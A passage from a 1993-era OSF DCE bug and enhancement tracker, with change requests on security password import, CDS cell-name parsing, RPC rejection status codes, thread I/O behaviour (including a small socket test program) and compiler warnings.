You could have stored it as a uuid (VT_UUID) and cds/rpc would
have taken care of endian issues.  IN addition cdscp would be
able to display it as such.

I don't know if this can be fixed gracefully, but if there is a time
when all security servers have to upgraded at once this would be
worth fixing.



CR Number                     : 8892
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : security/client/admin
Short Description             : passwd_import the passwords?
Reported Date                 : 10/1/93
Found in Baseline             : 1.0.2
Found Date                    : 10/1/93
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : many (rca, server/rs, idl)
Sensitivity                   : public

[10/1/93 public]
  It is not obvious why security cannot allow passwd_import to send the
Unix-crypted password for an account directly to the server for storage
as a pre-expired password. I imagine that an encrypted password could
be stored in the acct_user section of an account using mostly existing
code. This would greatly ease the importation of tens of thousands of
Unix accounts (at universities, for example).
  I presume that I am missing a serious problem in what it would take to
do this. Otherwise, could we register a new passwd type (plaintext, des,
unix?) for transmission of 13-byte encryptions (and salt)?

[10/1/93 public]

Changed to enhancement.

This would not be useful without adding a new, trusted, service which
registered the user. The UNIX crypt strings are not useable by DCE security
since they don't establish a shared secret between the user and the
security service.

In a workstation based environment, the users would have walk over to
specifically authorized workstations and type their passwords in there...
or else type them in the clear over the network.. to such a service.

If you want this to happen, tell the security SIG about it and have them
make it a requirement for 1.1.1...



CR Number                     : 8886
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8196
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : cdsd
Short Description             : Need a way to force background task to run
Reported Date                 : 10/1/93
Found in Baseline             : 1.0.3
Found Date                    : 10/1/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/1/93 public]

When the machine's IP address for a CDS server is changed, the background
task in cdsd eventually recognizes the confusion and fixes all of the old
references. 

This enhancement request is for a management interface to wake up the
background task to force this fixup.

[10/1/93 public]
This CR has some similarity  to OT#5915 which basically is that relocation of
a clearinghouse takes at least a hour to work because the change of ip address
gets propagated at least in (a) hours.



CR Number                     : 8877
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dts
Subcomponent Name             : dtscp
Short Description             : Wish to use '?' for help.
Reported Date                 : 9/29/93
Found in Baseline             : 1.0.3
Found Date                    : 9/29/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/29/93 public]
Customer wish dtscp to recognize question mark as equivalent to "help".

[10/25/93 public]
In control/dtsscp.cdt, I added the line
	CHAR ?  GOTO argHelp
after the line 
        WORD HELP        MIN 3                                  GOTO argHelp
That seems to do it.



CR Number                     : 8872
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : tkc
Short Description             : tkc not 64-bit ready
Reported Date                 : 9/29/93
Found in Baseline             : 1.0.2a
Found Date                    : 9/29/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/29/93 public]

In tkc, "struct tkc_sets" defines byteRangep as a pointer to an
afsHyper.  The lower 32 bits of the hyper is used to store the
beginning of the range, and the upper 32 bits is used for the end of
the range.  This is clearly not sufficient to support 64-bit file
ranges.  What we have done in the Alpha AXP port is to redefine
byteRabgep to be a structure containing two hypers, one each for the
begin and end range boundaries.  References to byteRangep in the tkc
code were changed to reflect this.

[10/8/93 public]
Assigning to myself so it doesn't fall through the cracks.  Changing
to enhancement and changing fixby to 1.1.  Steve, this is going 
to require further escalation through management if your goal
was to get this addressed in 1.0.3.  Please contact me out of
band if that is the case.  Thx.



CR Number                     : 8866
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : sec_key_mgmt_get_key() (&..key__type()) API should not return sec_rgy_bad_data status code
Reported Date                 : 9/28/93
Found in Baseline             : 1.0.3
Found Date                    : 9/28/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/key_mgmt/seckey_get.c
Sensitivity                   : public

[9/28/93 public]

Full Description:

	procedure sec_key_mgmt_get_key_type tests keydata, and if
it is NULL, sec_rgy_bad_data is assigned to the output parameter err.
Processing however, continues, through subsequent tests of authn_service
and key_vno, and if both authn_service and key_vno are acceptable, a
successfull call to SEC_KEY_CHECK_INIT will conceal the fact that
keydata was incorrect, allowing processing to continue. The probable result
is an addressing exception at *keydata = (void *) keys;

Proposed Solution:

	insert return; following detection of invalid keydata;

    if (keydata) {
        *keydata = NULL;
    } else {
        /*
         * Caller didn't pass a valid output parameter - 
         * return with an error status. (This should not be a 
         * sec_rgy error status!)
         */
        SET_STATUS(err, sec_rgy_bad_data);
        return;
    }

[09/29/93 public]
I suppose this should be written as
	if (keydata == NULL) {
	    SET_STATUS(err, sec_rgy_bad_data);
	    return;
	}
However, I would rather just see the whole if test removed.  We should
not be testing for NULL pointers; they just obscure application programming
errors.

[7/19/94 public]
The man pages I have do not list 'sec_rgy_bad_data' as a potential 
return from this API (as a matter of fact, they don't even list
..get_key_type() at all, only ..get_key() which simply calls ..key_type() 
with type 'sec_passwd_none').  Anyway, since there is no momentum from
the doc. side to keep this NULL input check, I agree with Rich that
it should be removed.  Anyone disagree?  I will change the short 
description to reflect this.



CR Number                     : 8688
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 8638
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : export/domestic packet privacy call rejection status values are not specific enough
Reported Date                 : 9/24/93
Found in Baseline             : 1.0.2
Found Date                    : 9/24/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/runtime/dgexec.c
Sensitivity                   : public

[9/24/93 public]

Full Description:

customers reported that in the case where a domestic client (DES
capable) contacts an export server (feature reduced) and requests
data privacy, the call is rejected by the server, but that it is
not easy to identify why the client call has failed or been rejected
given the error codes relayed by the server. The most common failure
status codes are rpc_s_comm_failure (DG) and rpc_s_connection_closed (CN).

In the case of DG, this seems to be merely a function of the RPC/NCA
rejection status mappings and the initial RPC status set by the RPC
runtime. The routine rpc__dg_execute_call() is run in the server
application. This results in a call to (*recv_ck)() from the auth_epv
functions. The (*recv_ck)() function does the appropriate protection
level checking and returns rpc_s_unsupported_authn_level status. The
rpc__dg_execute_call() function translates this status into the
rpc_s_who_are_you_failed reject status. The function queue_mapped_reject()
understands a limited subset of rpc error status codes, and translates
them into some (in)appropriate NCA status code, in this case
nca_s_comm_failure.

Proposed Solution:

pass rpc_s_unsupported_authn_level all the way back

[2/8/96 public]

DG was fixed in dce1.2.1.



CR Number                     : 8683
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : cds
Subcomponent Name             : 
Short Description             : The intercell does not work
between two cells when one GDS cellname is a subset of the other.
Reported Date                 : 9/24/93
Found in Baseline             : 1.0.2
Found Date                    : 9/24/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/24/93 public]

Machine A had GDS client/server & DCE installed.  Machine B had GDS client
only and DCE installed. DCE cellname of Machine A was
/.../C=us/O=ibm/OU=austin and that of B was
/.../C=us/O=ibm/OU=austin/OU=dce.

The entries of these cell names were added to GDS with correct values for
the attributes CDS_Cell and CDS_Replica.

After all these setup were done,  we are not able to read information from
the remote cell, which is on machine B.  Neither through XDS/XOM interface
nor through CDSCP.  In XDS/XOM, we get the error DS_E_NO_SUCH_OBJECT and in
CDSCP we get the following error message:

	Error on entity: /.../C=us/O=ibm/OU=austin/OU=dce/xyz
	Requested entry does not exist (dce/ cds)
	Function: dnsEnumAttr
	dnsEnumAttr: partial results = /.../C=us/O=ibm/OU=austin

The similar setup works if the cell name of the remote CDS cell is changed
from /.../C=us/O=ibm/OU=austin/OU=dce to /.../C=us/O=ibm/OU=texas/OU=dce.

It appears that if the cell name is the subset of the other cell name the 
above stated problem is seen.

[9/26/93 public]
The above is not a valid configuration.  It probably needs to be resolved
in the documentation.  To use the terms above, it is not legal to name a
cell as a subset of another.  In other words, while traversing a fully
qualified name, if there is a way to cross into another namespace, it will
be taken.  So when /.../C=us/O=ibm/OU=austin was reached, the name
resolution entered the CDS space of this cell, then it tried to find a CDS
entry called "OU=dce" and it wasn't there.

There are some issues here that will probably be resolved with the
Hierarchical Cells work in DCE 1.1.  In particular that the directory
servies resolve names by looking at the whole name and resolving them by
removing RDN's from the end to see if they can find the server closest to
the actual objects.  Other services in DCE (certainly security and maybe
DFS) resolve names by starting at the begining and resolving each RDN,
traversing any junctions found.  This means that the directory services
will allow you to create configurations that the rest of DCE can't use (as
shown by this bug).

This defect should probably be cancelled or converted into a doc bug.

[11/03/93 public]

I got a query into this OT from an interested end user.

His company's naming policy suggests using similar naming structures with
gds names. He belives that the current behavior is a problem. Even if DCE
1.1 fixes the problem, he will not get it from vendors until mid of 95. So
his first wish is to see it addressed in 1.0.3.

I don't know how DCE 1.1 will address this problem, but it is surly a
problem to solve if we want DCE to be really scalable. Using a structured
name scheme to name cells is very important to manage big number of cells.

I think one reason why cds chose to search the name from left to right is
that cds allows the user to create a dir/obj name with "=" in it. For
example, it is possible to create a directory /.:/ou=dce. Parsing or
traversing from right to left, you don't know where the cell name ends and
you have to do a gds query for every possibility. For a long name with "=" 
in every section of the name, such a parsing would take a longer time.

Maybe the solution is to disallow cds name with "=". In that case, it would
be easy to figure out where the cell name should end, like the case for DNS
cell name.

In any case, I don't think we should cancel this OT. Can we raise the 
priority? I know the chance to get it into 1.0.3 is little, but ...

[11/3/93 public]
The equal sign in the name isn't the problem. Your asking for hierarchical
cells. The following wouldn't work either.

Cell 1
/.../us/ibm/austin



Cell 2
/.../us/ibm/austin/dce

Attempting to reference an object in cell 2, 
/.../us/ibm/austin/dce/foobar from cell 1 will fail. To do this you need 
hierarchical cells. This a big piece of work planned for 1.1. Its very
unlikely that 1.0.3 would be held for it. I'm going to make this an
enhancement request for 1.1 which will get closed when the hierarchical
code comes in.

[11/3/93 public]
Let's be clear here: there is no chance any of this will make it into
1.0.3.  Sorry, but we freeze shortly and this is a lot of work.

This bug describes a problem in the GDS space, hierarchical cells deals
ONLY with cds names.  H-cells as currently spec'ed will NOT change this
behavior either.

This issue of how names are traversed is an interesting one.  Federated
naming and related systems (acls, rnd, etc.) all do traversals from left to
right so that you can know if you are going through a junction.  If a name
can span many namespaces you don't know what server you need to contact to
look for the whole name, you do know who to contact for the top of the
name, and you can traverse each component going through junctions as
needed.  That's why our parsing works that way.  

The weird and somewhat immaterial issue is that often directory services
look at the whole name for performance reasons.  If you give GDS or CDS a
whole name to look up, the server receiving the request will in a sense
evaluate the name from right to left to save time.  E.g. you give CDS the
name: /.:/a/b/c/d/e the server will say do I have this whole name?  If the
answer is no it will say, do I know which server contains /.:/a/b/c/d?  If
so then the request goes to it, if not it removes the last component and
tries again.  It knows that if it gets to the root it can go to someone so
the algorithm will terminate.  GDS works the same way.

Unfortunately other DCE components using the name spaces work the other
way.  For example, DFS in the namei() rountine has to track each component
name from left to right.  So given: /.:/C=US/O=OSF/OU=DCE it first asks GDS
about the US then about the US/OSF part then about the US/OSF/DCE name,
etc.  It's this discrepancy that causes some problems.  For example, in the
H-cell work both SEC and CDS need to have a concept of H-cells.  CDS
evaluates names one way and SEC evaluates names the other way.  CDS will
let you build an H-cell that SEC can't use.  The answer (for now) is don't
do that.

Now the = point.  The DCE string syntax is defined to allow you to enter
names in either a DNS cell or a GDS cell.  The GDA does the following:

	If there is a /... at the front?  
	   If there is an unescaped equal sign in the first component of
             the name send it to GDS
	   Otherwise send to DNS.

Now the GDS part of the GDA uses the junction model, it pings the GDS for
each component of the name from left to right and as soon as it finds a CDS
cell it goes there.  That is the documented behavior.  This means you can't
set up cells as mentioned in this bug.  That needs to be made clearer.

I've added Dick and Walt to the CC list to correct me if I'm mistaken on
any of these points.  I happen to think that what IBM wants is a good
thing, but it is NOT the way junctions work.

[11/11/93 public]
I have to retract some of my statements above.  We have a better
understanding of the problem so here again is another attempt at a complete
explanation: 

First, I was incorrect in saying that the GDA does a lookup one RDN at a
time looking for the first object that points to a cell.  The code does NOT
do this.  The GDA does a syntax check on the name, finds the first RDN that
does not have an = in it and sends all the prior RDNs to GDS to be looked
up at once.  In other words, the longest matching GDS cellname is found.
It is intersting that 3 different sources understood this NOT to be the
case, but it is what the code does.

So, how is the symption reported by the bug happening?  There are some
details that have to be inferred from the report.  The major one is that
they are trying to contact the child cell from the parent.  The names are
going through CDS (I'd have to figure out exactly what code path is taken
between components) and it's CDS that is having the problem.  

CDS keeps comparing for a match by removing the last element of the name
from the right hand side of the name.  It does this until there are no
elements of the name left or there is a match.  So, if you look up a name
in the child cell, and CDS looks in the cache, if a name in the child cell
is not there (i.e., this is the first time you are looking in the child
cell and CDS doesn't know about it), then it will keep stripping off RDN's
from the right until it runs out.  But when it strips of the RDN naming the
child cell, the name left is that of the parent.  If the parent is found in
the cache (and if you are in the parent cell, then obviously your own cell
name will be found in the cache) then the request goes there.  Now, I'm not
exactly sure of where everything I've mentioned happens.  I'm not sure if
this is in CDS cache code or CDS GDA code or where.  Someone needs to find
out.  My understanding is that IBM (Garry L. Child, email: garry) has a fix
for this.

Now once they fixed this they ran into a security problem.  This happened
when trying to configure these two cells for intercell communication.
Using the rgy_edit cell command, you create new principals for other cells
in your registry as part of intercell setup.  If you have the parent cell
setup, i.e., the name "krbtgt/c=us/o=ibm/ou=austin" is in the rgy, you
can't add the name "krbtgt/c=us/o=ibm/ou=austin/ou=dce" because the first
one is a princ type and not a directory type.  The ability to do this (i.e,
have a directory be both a directory and a principal) is known as
supporting polymorphic objects, and HP is planning on doing this as part of
their Hierarchical Cells work for DCE 1.1.

I've heard the HP (Joe Pato and Anne Anderson) have commented on this
problem and that that even though security will support this configuration
when polymorphic objects are implemented, since DCE resolves names to find
the shortest possible cellnames, the configure won't work.  Now I do NOT
know if they are refering to the same issues that we previously thought and
were incorrect on, or if there is something else.

Steps that I believe need to be taken to resolve this:

 * Find out what CDS code does the parsing using a method that gets the
   shortest cellname.
 * Either fix it ourselves or better yet, get the IBM fix if it is
   sufficient. 
 * Find out if there are any other security problems with this
   configuration or do they only occur when setting up intercell.
 * Find out if any other components "parse names" and if so how.  For
   example, I *think* that DFS parses names to find the shortest possible 
   cellname, but I'm not sure.
 * OSF needs to state categorically whether H-cells are supported in some
   or all namespaces (e.g., they are not supported in DCE 1.0 CDS, but they
   will be supported in DCE 1.1 CDS.  They are supported in DNS.  Are they
   supported in X.500?  Do they need to be supported in any future
   namespaces?)  Also "supported" needs to be clearly defined.  To be
   supported by DCE, all DCE components must function.  If not then we need
   to be able tell customers what will happen if they try this (or simply
   say, don't do that).  This means we must state how names are to be
   parsed, and correct any code that does this incorrectly.

This should all make for a fun discussion on dce-tech or Tech Conference
Calls.  :-)

[11/15/93]

I am Jay N. working for Garry Child.  We at IBM made an attempt at
identifying the changes that are needed to support the naming convention
without getting to the details of H-cell implementation.  We started with
the assumption that only the parsing of the name need to be modified
appropriately to support this naming convention.

In cdsclerk the tree walk is performed by traversing the fully qualified
name from right to left.  This is done in clerk_WalkTree()

[clerk_tree_walk.c]. The rightmost simple name is stripped
(childStripRSimple()) then the requested object is looked up in the cache.
If it is not found in the cache, then the requested name is provided to
the server which would either resolve that name or provide the clerk with
a referral list of clearinghouses.

If a referral list is obtained then an attempt is made to choose an
object that best suits the requested name by contacting the servers of
each clearinghouse in the list. In doing so the GDA may also be contacted
because of the dummy clearinghouse(...gda_ch).

On the server side, the unresolved name is used to perform the tree walk.
This is done in the walktree_assist() [ta_lookup.c]. The rightmost simple
name is stripped and an attempt is made to build a clearinghouse list to
be returned to the clerk .  The above is repeated till the simple names
are exhausted or a list of clearinghouse is built.

These are the relevant routines that we identified, where the parsing
of the names are performed.

The following functions were modified to support the customer's naming
convention:

        Process         File                    Function
        -------         ----                    --------

        cdsclerk        clerk_miscel.c          childStripRSimple()

        cdsd            names_lib.c             names_stripright()
                        ta_lookup.c             walktree_assist()

The algorithm was modified to look for a "=" character in the RDNs
and to conclude that it is part of a cellname and to stop stripping any
further.  The idea is to retain the cellname and pass it on to GDA so
that GDS would resolve the name.

By introducing this simple fix we were able to do unauthenticated
intercell operations.  But the "cell" command of rgy_edit failed due to
the reasons that are well understood (explained above by melman).

The objective was to identify the processes and functions that are
affected and to understand the incompatibility and interoperability
issues.  So we used this simple [test]case where CDS objects do not
have names with the "=" character and the GDS names do not have an
escaped "=" character.

We strongly concur with melman that OSF needs to state categorically
whether this naming convention is supported in some/all namespaces.
Even though we have a partial fix, because of potential interoperability
problems that may arise due to the security changes that need to be made,
we recommend, considering the current scenario of 1.0.3 freeze, that the
H-cell be supported only in 1.1 release.

The customers need to be notified about the current limitations in the
cell naming and if possible suggest an easy migration path for them to
H-cell.

[11/15/93 public]

I will append my early mail to dce-ot-cds here regarding this OT. I believe
that the main problem is, with current naming scheme, the cell name and cds
name are mixed together. How to determien the cell name is the main issue
here. Once the cell name is found, the rest can be processed by cds as
whatever happens now. IBM's simple fix of using "=" to detemrine the cell
name is trying to address this problem, although it will not work if people
put "=" in their cds names, which is legal.

I was thinking of providing a way to uniquely identify a cell name, just
like /.:/ will do. For example (there can be many ways to clearly specify a
cell name), /.../cell_name:/cds_name.

With /.../cell_name:/cdsname or /.:/cds_name, one knows what the cell name
should be immediately. For cds name part, do what the current DCE does
(either parse it from left to right to find junctions, or right to left to
save time. Whatever).

For the cell_name part, assuming it is a/b/c/d where a:b:c:d can be either
DNS or GDS format, we can do the following:

- for current dce, simply try to find cell information with cell_name
through either DNS or GDS. If not found, return error.

- For 1.1 where hierarchical cell is supported, if a/b/c/d can be found
from external directory service, go for it. Otherwise check if DNS/GDS can 
resolve a/b/c and if so, whether cell a/b/c has a child cell pointer to d.
if so, you go to d from cell a/b/c. If not, check if DNS/GDS can provide
info for cell a/b and if so whether cell a/b can provide child for c/d or c
that from c to d. etc.

I just read the DEC's hcell spec. Clearly, the spec only addresses the
hierachy that a cell name can have. It assumes, unstated, that you know
what the cell name is.

To summarize, I believe that the problem lies in the fact that cell name is
hard to determine, hence forcing us to mix the different treatments for cds
names with cell name resolution. Then, of course, is the security problems.

[11/15/93 public]
Currently it is policy that the first CDS name beneath a GDS name not have
an = in it.  This is in the AES.  Thanks very much for the comments Jay N.,
the more we all know and share about this the better.

I have not thought through the implications of H-cells in naming cells in
the CDS space, but clearly this must be done.  At first thought I am
against adding info into our string syntax to identify cell names.

[11/15/93 public]

It is good to know that "=" is not allowed in the first cds name, which
makes IBM's fix a feasible one.

But when 1.1 H-cell is out, any level of hierarchy is possible. A cell name
can be a/b/c/d, where a/b/c/d can be anything. Clearly "=" identification
will be far from enough.

The current DEC spec of H-cell talks about cell names, what and how
hierarcy of cell name will work. THere is no statements about how a cell
name should be determined.

I understand the implication it has if we introduce a new naming scheme.
But with the current name parsing, to work well with H-cell, it may mean
much overhead. Let say we want to search /.../a/b/c/d/e/f from cell /.../A.
Cds does right to left search in the cache. Nothing found. Now it is
inter-cell time. Since H-cell is possible. there are 5 or 6
possibilities to check. No matter you search from left to right or right to
left, to be complete, you have to do backtracking (i.e., one shot searching
that is used now for determinign the cell name is no longer enough):

1. from left to right:
	if a is a cell name (from DNS or GDS) {
	    if (b/c/d/e/f is cds name) {
		done
	    }
	    else {
	      if (b is a child pointer) {
		if (c/d/e/f is cds name) {
		  done
		}
		else {
		  if (c is a child pointer}
	....
	}
	else if a/b/is a cell name (from DNS/GDS) {
	    if (c/d/e/f is cds name)
	....

2. from right to left:
	if a/b/c/d/e/f is cell name (from DNS/GDS) {
		done
	}
	else if (a/b/c/d/e is cell name) {
	  if (f is cds name) done
	  else if (f is child pointer) done
	  else error
	}
	else if (a/b/c/d is cell name) {
	  if (e/f is cds name) done
	  else if (e is child ptr) {
	    if (f is cds namae) done
	    if 
 	....

As can be seen, the search space grows exponentially with more "/"s. If
you type in a wrong name, be prepared to wait for a while before being
notified an error.

Clearly specifying the cell name will cut down the search space
significantly. 

I would like to see other posisble search/parsing algorithms that are
faster and complete (covers all possible situations).



CR Number                     : 8669
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : pmax
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : Too many select calls
Reported Date                 : 9/23/93
Found in Baseline             : 1.0.2a
Found Date                    : 6/09/93
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/23/93 public]

Adding an extra cma__io_available call in cma_dispatch.c by jd on 
April 07, 1993 has caused excessive select/sendmsg/recvmsg calls and 
thus degraded rpc performance as documented by hsiao on June 09, 1993. 

Note that John's fix was to prevent a DFS starvation problem and thus
we cannot just take that extra cma__io_available call away to fix this 
problem.



CR Number                     : 8667
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : threads/cma_thdio_4.c
Short Description             : cma_connect returns values
other than 0 or -1
Reported Date                 : 9/23/93
Found in Baseline             : 1.0.2
Found Date                    : 9/23/93
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/23/93 public]

The licensee reported:

        cma_connect will return values other than 0 or -1.  It will frequently
        return the value returned by select.


Checking the code indicates that when cma_select returns a positive number
(the number of descriptor ready) and the descriptor is for write,
cma_connect will simply return the return value of cma_select, a positive
number. connect semantics requires that return be either 0 or -1.

To show the problem, run the following test code (link with -ldce so that
cma stuff is used). You also need to have a small server code running on 
another host waiting to be connected (on the same port). Here is what returns 
on my sparc:

$ conn pierrot
connection completed: errno is 36, connect returned 1

(errno 36: EINPROGRESS /* Operation now in progress */)

(If you need the server code, please let me know).

#include <sys/types.h>
#include <sys/time.h>
#include <sys/signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/errno.h>
#include <stdio.h>
#include <sys/filio.h>
#include <dce/cma.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define DEFAULT_PORT        22979

#define bcopy(s,d,l)    memcpy(d,s,l)
#define bzero(a,l)  memset(a,0,l)

char *Progname;
int Verbose = 0;

extern int errno;

void
connect_test( host, port )
    char *host;
    int port;
{
    int sock;
    struct sockaddr_in servaddr;
    struct hostent *hostp;
    extern struct hostent *gethostbyname();
    int flag = 1;
    int connect_complete = 0;
    int serr = 0;

    if ( (sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP ) ) == -1) {
        fprintf( stderr, "errno %d: ", errno );
        perror("socket");
        fflush( stderr );
    } else if ( ioctl( sock, FIONBIO, &flag ) == -1 ) {
        fprintf( stderr, "errno %d: ", errno );
        perror("ioctl");
        fflush( stderr );
        close( sock );
    } else if ( !(hostp = gethostbyname( host )) ) {
        fprintf( stderr, "%s: TCP test: host %s unknown\n", Progname, host );
        fflush( stderr );
        close( sock );
    } else {
        bzero( &servaddr, sizeof( servaddr ) );
        servaddr.sin_family = AF_INET;
        bcopy( hostp->h_addr, &servaddr.sin_addr, hostp->h_length );
        servaddr.sin_port = port;
        while ( !connect_complete ) {
            if ( (serr = connect( sock, &servaddr, sizeof( servaddr ) ))
                == -1 ) {
                    switch ( errno ) {
                        case EINTR:
                            break;
                        default:
                            connect_complete = 1;
                            fprintf( stderr, "errno %d: ", errno );
                            perror( "connect" );
                            fflush( stderr );
                            break;
                }
            } else {
                connect_complete = 1;
            }
        }
        printf( "connection completed: errno is %d, connect returned %d\n",
            errno, serr );
        shutdown( sock );
        close( sock );
    }
    return;
}

usage()
{
    fprintf( stderr, "usage: %s hostname\n", Progname );
    exit( -1 );
}

main( argc, argv )
    int argc;
    char **argv;
{
    char *argp;
    int port = DEFAULT_PORT;
    int err = -1;

    Progname = *argv++;
    if ( --argc ) {
        connect_test( *argv, port );
    } else {
        fprintf( stderr, "%s: missing host name\n", Progname );
    }
    return( err );
}



CR Number                     : 8665
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : security client binding
Short Description             : enhance security client binding
Reported Date                 : 9/22/93
Found in Baseline             : 1.0.3
Found Date                    : 9/22/93
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/22/93 public]
The security client binding model should be enhanced:
1. to allow administrators to specify the 'best,'
'closest,' or favored secd site(s) for a 
given DCE client machine,
2. to randomize the order in which secd bindings are
chosen OR to provide load sharing amongst all
available secd sites,
3. to reduce the likelihood that a given binding
will be tried if a previous attempt to bind with
it from this client machine failed.

Caching for #3 should be applied at the DCE client
machine level (not per application) so that
subsequent invocations of clients (like dce_login)
benefit from earlier invocations.

[9/22/93 public]

This functionality really belongs in CDS.

An administrator should be able to create a file containing
address/mask/weight tuples which the cds client code (either the clerk or
the NSI code; I'm not sure which) uses to sort addresses returned from the
name space.

the "addresses" should be in string binding form; exactly how to express a
"mask" in string binding form would be an interesting problem (and may
require minor extensions to string binding syntax).

Addresses with the same weight should be randomized (and I really mean
*randomized*, not "pick the first one").

[09/23/93 public]
Isn't a large portion of this "external file" stuff already handled by
RPC profiles?

[9/23/93 public]

Profiles require far too much manual intervention, and are too hard to get
right, both in the services and for administrators; you have to hack each
one on a service-by-service basis.  I should be able to give general rules
("prefer something on the local net, then something in the local swamp, and
don't ever go to a server over in europe unless there's no other choice")
which are *distinct* from the coding of the applications or the
installation of individual services, which are then used to select the
ordering in which applications see the binding info back from the name
service.

I guess what I'm looking for is something along the lines of the BIND
"sortlist" feature.



CR Number                     : 8652
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : cds
Subcomponent Name             : cds/control
Short Description             : Compiler warnings
Reported Date                 : 9/22/93
Found in Baseline             : 1.0.2
Found Date                    : 9/22/93
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[9/22/93 public]

The licensee reported the following compiler warnings:

     confidence.c, default_ent.c, dnscp_crekind.c, dnscp_creobj.c,
     dnscp_cresl.c, dnscp_delkid.c, dnscp_delobj.c, dnscp_delsl.c,
     dnscp_replica.c, emit_one_line.c, emit_ref_hdr.c, exec_docmod.c,
     preferred_clh.c
     ---------------

"/dce/dce_8/src/directory/cds/control/confidence.c", line 81: warning: dubious
tag declaration: struct op_blk
"/dce/dce_8/src/directory/cds/control/confidence.c", line 93: warning: dubious
tag declaration: struct op_blk

     The header file op_list_defs.h should be included to prevent a dubious
     tag declaration warning.

     emit_cds_values.c
     -----------------
     At line 258:

     for (i=0; i<value_p->val_u.val_byte.length; i++, ++thechar) {
          SHOULD BE REPLACED WITH
     for (i=0; i<(int)value_p->val_u.val_byte.length; i++, ++thechar) {

The better fix is to declare i as an unsigned type.

     emit_member_lines.c, emit_pptimeout_lines.c, emit_towerset_lines.c,
     emit_replica_pointer_lines.c, emit_timeout_lines.c, emit_tower_lines.c,
     err_report.c
     ------------

"/dce/dce_8/src/directory/cds/control/emit_member_lines.c", line 53: warning:
dubious tag declaration: struct msgblk
"/dce/dce_8/src/directory/cds/control/emit_member_lines.c", line 54: warning:
dubious tag declaration: struct op_blk

     The header files op_list_defs.h and msgblk.h should be included to
     prevent a dubious tag declaration warning.


     process_commands.c
     ------------------

"/dce/dce_8/src/directory/cds/control/process_commands.c", line 73: warning:
dubious tag declaration: struct op_blk
"/dce/dce_8/src/directory/cds/control/process_commands.c", line 74: warning:
dubious tag declaration: struct msgblk
"/dce/dce_8/src/directory/cds/control/process_commands.c", line 75: warning:
dubious tag declaration: struct entblk
"/dce/dce_8/src/directory/cds/control/process_commands.c", line 76: warning:
dubious tag declaration: struct attrblk
"/dce/dce_8/src/directory/cds/control/process_commands.c", line 77: warning:
